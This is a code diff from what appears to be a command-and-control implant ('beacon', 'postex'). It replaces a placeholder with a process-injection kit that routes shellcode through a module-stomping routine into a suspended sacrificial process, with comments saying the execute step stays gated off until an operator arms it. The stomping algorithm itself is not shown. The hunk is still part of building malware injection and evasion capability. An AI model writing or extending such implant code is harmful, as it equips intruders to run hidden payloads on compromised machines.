@@ -75,16 +75,32 @@ pub trait ProcessInjectKit {
     }
 }
 
-/// Default process-inject kit: no technique yet. Module stomping lands in P2.
-pub struct NotImpl;
-impl ProcessInjectKit for NotImpl {}
+/// Default process-inject kit: delegates to `crate::inject::module_stomp`
+/// (P2.1c). The stomp+resume tail there is gated (`inject::modulestomp_enabled`,
+/// default OFF), so by default this only creates a suspended sacrificial
+/// process and returns its handle — NOT executing any shellcode — until an
+/// operator arms the gate. Kept as a `ProcessInjectKit` impl so the postex
+/// `inject()` entry routes through the real data path (CreateProcessW) and the
+/// SDK `ModuleStomper` impl stays the single source for the algorithm.
+pub struct ModuleStompKit;
+impl ProcessInjectKit for ModuleStompKit {
+    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
+        // SAFETY: single-threaded beacon context. With the stomp gate OFF
+        // (default) this only creates a suspended process — no shellcode runs.
+        let h = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
+        Some(InjectedHandle(h))
+    }
+}
 
 /// The active process-inject kit.
-const PROCESS_INJECT_KIT: NotImpl = NotImpl;
+const PROCESS_INJECT_KIT: ModuleStompKit = ModuleStompKit;
 
-/// Postex-facing injection entry. Returns `None` today (NotImpl); a real kit
-/// makes spawn-to + execute-in-sacrificial-process available to postex without
-/// a postex rewrite.
+/// Postex-facing injection entry. Routes through the active kit
+/// (`ModuleStompKit` → `crate::inject::module_stomp`). Returns `None` if
+/// CreateProcessW fails (spawn_to missing / blocked); returns a handle to a
+/// SUSPENDED sacrificial process otherwise. The actual .text stomp + resume
+/// runs only when `inject::modulestomp_enabled` is armed (default OFF) — until
+/// then this is the safe data path (no cross-process write/execute).
 pub fn inject(spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
     PROCESS_INJECT_KIT.inject(spawn_to, shellcode)
 }
